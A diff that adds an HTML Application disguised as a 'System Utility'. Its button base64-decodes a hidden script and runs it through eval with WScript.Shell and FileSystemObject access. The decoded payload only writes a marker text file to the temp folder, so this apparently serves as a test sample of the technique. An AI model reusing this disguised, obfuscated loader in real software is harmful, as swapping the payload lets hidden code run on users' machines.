@@ -1,0 +1,56 @@
+<html>
+<head>
+    <title>System Utility</title>
+    <HTA:APPLICATION
+        ID="htaUtil1"
+        APPLICATIONNAME="System Utility"
+        VERSION="1.0"
+        BORDER="thin"
+        CAPTION="yes"
+        CONTEXTMENU="no"
+        NAVIGABLE="no"
+        SCROLL="no"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+    />
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        .container { padding: 15px; border: 1px solid #ddd; background: white; margin: 10px 0; }
+        button { padding: 8px 15px; margin: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>System Information Utility</h2>
+        <button onclick="executeAnalysis()">Run Analysis</button>
+        <button onclick="window.close()">Exit</button>
+    </div>
+    <div id="results" class="container" style="display:none;"></div>
+
+    <script>
+        // Base64 obfuscated payload decoder
+        var b64Payload = "dmFyIHNoZWxsID0gbmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKdmFyIGZzbyA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpOwp2YXIgdGVtcFBhdGggPSBmc28uR2V0U3BlY2lhbEZvbGRlcigyCik7CnZhciB0ZXN0RmlsZSA9IGZzby5CdWlsZFBhdGgodGVtcFBhdGgsICdzeXNfdGVzdF8nICsgRGF0ZS5ub3coKSArICcudHh0Jyk7CnRyeSB7CiAgICB2YXIgZmlsZSA9IGZzby5DcmVhdGVUZXh0RmlsZSh0ZXN0RmlsZSk7CiAgICBmaWxlLldyaXRlTGluZSgnU3lzdGVtIFRlc3QgRXhlY3V0ZWQnKTsKICAgIGZpbGUuQ2xvc2UoKTsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRzJykuaW5uZXJIVE1MID0gJ0FuYWx5c2lzIGNvbXBsZXRlZCc7CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgeyB3aW5kb3cuY2xvc2UoKTsgfSwgMzAwMCk7Cn0gY2F0Y2goZSkgewogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdHMnKS5pbm5lckhUTUwgPSAnRXJyb3I6ICcgKyBlLm1lc3NhZ2U7Cn0K";
+
+        function executeAnalysis() {
+            try {
+                var resultsDiv = document.getElementById('results');
+                resultsDiv.style.display = 'block';
+                resultsDiv.innerHTML = '<p>Executing system analysis...</p>';
+
+                // Decode and execute base64 payload
+                var decodedScript = atob(b64Payload);
+
+                // Execute decoded commands
+                eval(decodedScript);
+            } catch(e) {
+                document.getElementById('results').innerHTML = '<p style="color:red;">Error: ' + e.message + '</p>';
+            }
+        }
+
+        window.onload = function() {
+            // Silent initialization
+        };
+    </script>
+</body>
+</html>
